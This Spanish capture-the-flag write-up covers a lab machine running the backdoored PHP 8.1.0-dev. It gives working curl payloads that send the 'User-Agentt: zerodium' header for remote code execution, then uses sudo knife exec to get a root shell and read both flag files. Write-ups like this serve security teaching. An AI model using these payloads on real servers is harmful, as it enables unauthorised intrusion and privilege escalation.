// 01

Resumen

Resumen. La web (Apache + PHP) anuncia en las cabeceras X-Powered-By: PHP/8.1.0-dev. Esa versión es la que quedó backdoorizada cuando comprometieron el repositorio de PHP en marzo de 2021: si se envía la cabecera User-Agentt (con la doble "t") empezando por zerodium, el resto se evalúa como PHP. Con zerodiumsystem("id") se ejecuta lo que queramos como james y se lee la user flag. sudo -l muestra que james puede lanzar knife (la CLI de Chef) como root, y knife exec -E ejecuta código Ruby → shell de root.

// NOTA

Versión simplificada (la usada): dos peticiones curl. No hizo falta ni reverse shell: el backdoor devuelve la salida del comando en la propia respuesta HTTP, y knife exec también.

// 03

Reconocimiento

SHELL
$ sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.7.176
$ curl -s -D- -o /dev/null http://10.129.7.176/ | grep -iE 'server|x-powered'

Lo que se encontró:

Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev

Esa versión concreta es la backdoorizada (PHP 8.1.0-dev, marzo 2021). No hay rutas interesantes: el vector es el propio intérprete.

// 04

Backdoor → RCE como james

La web evalúa el contenido de la cabecera User-Agentt (la errata con dos "t" es parte del backdoor) cuando empieza por zerodium:

SHELL
$ curl -s -H 'User-Agentt: zerodiumsystem("id");' http://10.129.7.176/
# uid=1000(james) gid=1000(james) groups=1000(james)
SHELL
$ curl -s -H 'User-Agentt: zerodiumsystem("cat /home/james/user.txt");' http://10.129.7.176/

Lo que se encontró: user flag [flag oculta].

Por qué funciona: el commit malicioso (luego revertido) añadía en ext/zlib/zlib.c un zend_eval_string sobre el valor de HTTP_USER_AGENTT tras la palabra zerodium; es decir, ejecución de PHP arbitraria en cada petición.

// 05

sudo knife → root

SHELL
$ curl -s -H 'User-Agentt: zerodiumsystem("sudo -n -l");' http://10.129.7.176/
# User james may run the following commands on knife:
# (root) NOPASSWD: /usr/bin/knife

knife es la CLI de Chef; knife exec -E evalúa código Ruby:

SHELL
$ curl -s -H 'User-Agentt: zerodiumsystem("sudo knife exec -E \x27exec \"id; cat /root/root.txt\"\x27");' \
$ http://10.129.7.176/
# uid=0(root) gid=0(root) groups=0(root)
# [flag oculta]

Lo que se encontró: root flag [flag oculta].

Trampa de comillas: la cabecera lleva comillas simples y dobles anidadas. Lo más cómodo es escribir la cabecera en un fichero y usar curl -H @fichero:

SHELL
$ printf '%s\n' 'User-Agentt: zerodiumsystem("sudo knife exec -E '"'"'exec \"id; cat /root/root.txt\"'"'"'");' > /tmp/h1.txt
$ curl -s -H @/tmp/h1.txt http://10.129.7.176/

Alternativa (sin exec): knife data bag create 0xdf output -e vim abre vim como root y :!/bin/bash da shell.
